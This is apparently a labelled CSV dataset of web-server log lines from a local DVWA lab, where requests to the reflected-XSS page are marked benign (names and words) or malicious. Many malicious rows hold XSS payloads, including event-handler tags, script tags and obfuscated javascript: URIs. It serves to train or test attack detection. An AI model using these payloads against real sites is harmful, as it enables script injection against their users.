,url,malicious
3401,"127.0.0.1 - - [03/May/2021:03:06:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=fitxers HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13000,"127.0.0.1 - - [03/May/2021:03:40:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<figure onmouseover=\""alert(1)\"">test</figure>"" 400 0 ""-"" ""-""",1
9129,"127.0.0.1 - - [03/May/2021:03:12:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Celisse HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12093,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=perl -e"" 400 0 ""-"" ""-""",1
7671,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<kbd onmouseenter=\""alert(1)\"">test</kbd>"" 400 0 ""-"" ""-""",1
7214,"127.0.0.1 - - [03/May/2021:03:23:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Natver HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12851,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG \""\""\""><SCRIPT>alert(\""XSS\"")</SCRIPT>\"">"" 400 0 ""-"" ""-""",1
6786,"127.0.0.1 - - [03/May/2021:03:40:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<menuitem onmouseleave=\""alert(1)\"">test</menuitem>"" 400 0 ""-"" ""-""",1
8462,"127.0.0.1 - - [03/May/2021:03:40:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<del onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
2543,"127.0.0.1 - - [03/May/2021:03:40:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",1
6838,"127.0.0.1 - - [03/May/2021:03:40:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<marquee onmouseover=\""alert(1)\"">test</marquee>"" 400 0 ""-"" ""-""",1
7608,"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
9735,"127.0.0.1 - - [03/May/2021:03:40:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<aside onmouseup=\""alert(1)\"">test</aside>"" 400 0 ""-"" ""-""",1
15051,"127.0.0.1 - - [03/May/2021:03:26:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tai-Jen HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1525,"127.0.0.1 - - [03/May/2021:03:14:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dita HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5015,"127.0.0.1 - - [03/May/2021:03:15:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Elfrida HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8722,"127.0.0.1 - - [03/May/2021:03:27:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tommie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17787,"127.0.0.1 - - [03/May/2021:03:41:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><th"" 400 0 ""-"" ""-""",1
8679,"127.0.0.1 - - [03/May/2021:03:25:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rudy HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1710,"127.0.0.1 - - [03/May/2021:03:12:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Carita HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2699,"127.0.0.1 - - [03/May/2021:03:41:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<s onmousemove=\""alert(1)\"">test</s>"" 400 0 ""-"" ""-""",1
17015,"127.0.0.1 - - [03/May/2021:03:19:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kerstin HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4028,"127.0.0.1 - - [03/May/2021:03:41:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<sub onmousemove=\""alert(1)\"">test</sub>"" 400 0 ""-"" ""-""",1
13126,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><script>//&NewLine;confirm(1);</script </svg>"" 400 0 ""-"" ""-""",1
9861,"127.0.0.1 - - [03/May/2021:03:08:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=statistics HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15967,"127.0.0.1 - - [03/May/2021:03:12:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bryna HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1717,"127.0.0.1 - - [03/May/2021:03:25:17 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rubi HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10735,"127.0.0.1 - - [03/May/2021:03:25:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rozalie HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7602,"127.0.0.1 - - [03/May/2021:03:21:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Manou HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9285,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>%(payload)s</script> HTTP/1.1"" 200 1709 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
17466,"127.0.0.1 - - [03/May/2021:03:23:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Patty HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14907,"127.0.0.1 - - [03/May/2021:03:40:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<em id=x"" 400 0 ""-"" ""-""",1
5007,"127.0.0.1 - - [03/May/2021:03:40:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<menu onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
3108,"127.0.0.1 - - [03/May/2021:03:08:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=vertigo HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16923,"127.0.0.1 - - [03/May/2021:03:40:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",1
10008,"127.0.0.1 - - [03/May/2021:03:41:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<wbr draggable=\""true\"""" 400 0 ""-"" ""-""",1
6114,"127.0.0.1 - - [03/May/2021:03:23:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Parviz HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2473,"127.0.0.1 - - [03/May/2021:02:34:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""`'><script>\\xE2\\x80\\x89javascript:alert(1)</script> HTTP/1.1"" 200 1724 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
9410,"127.0.0.1 - - [03/May/2021:03:10:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Akram HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15414,"127.0.0.1 - - [03/May/2021:03:06:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=edwin HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9810,"127.0.0.1 - - [03/May/2021:03:41:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><hgroup"" 400 0 ""-"" ""-""",1
8791,"127.0.0.1 - - [03/May/2021:03:05:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=camille HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16948,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<link ondblclick=\""alert(1)\"">test</link>"" 400 0 ""-"" ""-""",1
14147,"127.0.0.1 - - [03/May/2021:03:41:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<small onmouseout=\""alert(1)\"">test</small>"" 400 0 ""-"" ""-""",1
4373,"127.0.0.1 - - [03/May/2021:03:14:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Doralyn HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2873,"127.0.0.1 - - [03/May/2021:03:10:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Andy HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12804,"127.0.0.1 - - [03/May/2021:03:40:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<big draggable=\""true\"""" 400 0 ""-"" ""-""",1
125,"127.0.0.1 - - [03/May/2021:03:41:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noscript draggable=\""true\"""" 400 0 ""-"" ""-""",1
12496,"127.0.0.1 - - [03/May/2021:03:16:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gheorghe HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14460,"127.0.0.1 - - [03/May/2021:03:05:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=desarrollo HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
683,"127.0.0.1 - - [03/May/2021:02:34:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""javas\\x09cript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",1
17829,"127.0.0.1 - - [03/May/2021:03:23:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ossama HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14886,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<picture><source srcset=\""validimage.png\""><image"" 400 0 ""-"" ""-""",1
10510,"127.0.0.1 - - [03/May/2021:03:22:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Morgan HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15227,"127.0.0.1 - - [03/May/2021:03:40:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dl id=x"" 400 0 ""-"" ""-""",1
14901,"127.0.0.1 - - [03/May/2021:03:18:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jackquelin HTTP/1.1"" 200 1702 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13555,"127.0.0.1 - - [03/May/2021:02:35:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=XSS STYLE=xss:e/**/xpression(alert('XSS'))>"" 400 0 ""-"" ""-""",1
9230,"127.0.0.1 - - [03/May/2021:03:22:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Myrle HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6540,"127.0.0.1 - - [03/May/2021:03:26:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Steven HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5191,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<textarea id=x"" 400 0 ""-"" ""-""",1
12802,"127.0.0.1 - - [03/May/2021:03:19:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Julianne HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7103,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""'`><\\x00img src=xxx:x"" 400 0 ""-"" ""-""",1
17900,"127.0.0.1 - - [03/May/2021:03:08:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=shiva HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17814,"127.0.0.1 - - [03/May/2021:03:13:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Collie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
930,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""`'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script> HTTP/1.1"" 200 1723 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
15946,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<bdi oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
3836,"127.0.0.1 - - [03/May/2021:03:28:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Zarah HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5652,"127.0.0.1 - - [03/May/2021:03:21:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mala HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1362,"127.0.0.1 - - [03/May/2021:03:12:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Carolynn HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6919,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;META HTTP-EQUIV=&quot;Link&quot;"" 400 0 ""-"" ""-""",1
14706,"127.0.0.1 - - [03/May/2021:03:24:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Quoc-Vu HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9590,"127.0.0.1 - - [03/May/2021:03:41:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noscript draggable=\""true\"""" 400 0 ""-"" ""-""",1
14055,"127.0.0.1 - - [03/May/2021:03:05:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=buscar HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3354,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div style=\""list-style:url(http://foo.f)\\20url(javascript:javascript:alert(1));\"">X"" 400 0 ""-"" ""-""",1
12152,"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""javascript:void(0)\"""" 400 0 ""-"" ""-""",1
8826,"127.0.0.1 - - [03/May/2021:03:16:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ferdinanda HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4074,"127.0.0.1 - - [03/May/2021:03:41:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<select onmouseup=\""alert(1)\"">test</select>"" 400 0 ""-"" ""-""",1
14137,"127.0.0.1 - - [03/May/2021:03:26:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Stephan HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1540,"127.0.0.1 - - [03/May/2021:03:17:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hermina HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4546,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\""jav&#x0A;ascript:alert('XSS');\"">"" 400 0 ""-"" ""-""",1
2138,"127.0.0.1 - - [03/May/2021:03:12:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cathyleen HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5511,"127.0.0.1 - - [03/May/2021:03:15:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Faz HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3568,"127.0.0.1 - - [03/May/2021:03:22:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Murial HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9886,"127.0.0.1 - - [03/May/2021:03:40:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<isindex onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
2783,"127.0.0.1 - - [03/May/2021:03:16:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Germana HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
831,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<picture onmousedown=\""alert(1)\"">test</picture>"" 400 0 ""-"" ""-""",1
16517,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\""livescript:[code]\"">"" 400 0 ""-"" ""-""",1
14264,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<nobr id=x"" 400 0 ""-"" ""-""",1
558,"127.0.0.1 - - [03/May/2021:03:27:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Vadi HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7208,"127.0.0.1 - - [03/May/2021:02:34:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<? foo=\""><script>javascript:alert(1)</script>\"">"" 400 0 ""-"" ""-""",1
10685,"127.0.0.1 - - [03/May/2021:03:13:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cheslie HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17350,"127.0.0.1 - - [03/May/2021:03:10:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Allx HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
472,"127.0.0.1 - - [03/May/2021:03:25:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Roshelle HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1801,"127.0.0.1 - - [03/May/2021:03:26:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Shlomo HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17544,"127.0.0.1 - - [03/May/2021:03:15:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ethyl HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4624,"127.0.0.1 - - [03/May/2021:03:40:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<figcaption draggable=\""true\"""" 400 0 ""-"" ""-""",1
3823,"127.0.0.1 - - [03/May/2021:03:07:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=privado HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10125,"127.0.0.1 - - [03/May/2021:02:34:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script> HTTP/1.1"" 400 0 ""-"" ""-""",1
17717,"127.0.0.1 - - [03/May/2021:03:27:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Torrie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
623,"127.0.0.1 - - [03/May/2021:03:20:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Logntp HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10270,"127.0.0.1 - - [03/May/2021:03:07:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=minimum HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10653,"127.0.0.1 - - [03/May/2021:03:41:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><dir"" 400 0 ""-"" ""-""",1
1913,"127.0.0.1 - - [03/May/2021:03:27:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Teetwo HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
